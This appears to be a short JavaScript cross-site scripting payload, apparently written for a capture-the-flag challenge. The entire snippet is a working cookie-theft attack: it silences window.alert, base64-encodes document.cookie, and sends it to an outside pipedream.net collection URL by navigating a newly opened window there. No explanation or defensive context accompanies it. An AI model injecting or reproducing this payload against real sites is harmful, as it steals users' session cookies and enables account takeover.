window.alert = function() {console.log("alert(1337)")};
let cookie = btoa(document.cookie); 
flag = window.open("");
flag.window.document.location = "https://eoctl0knzoys9l9.m.pipedream.net/?flag="+cookie
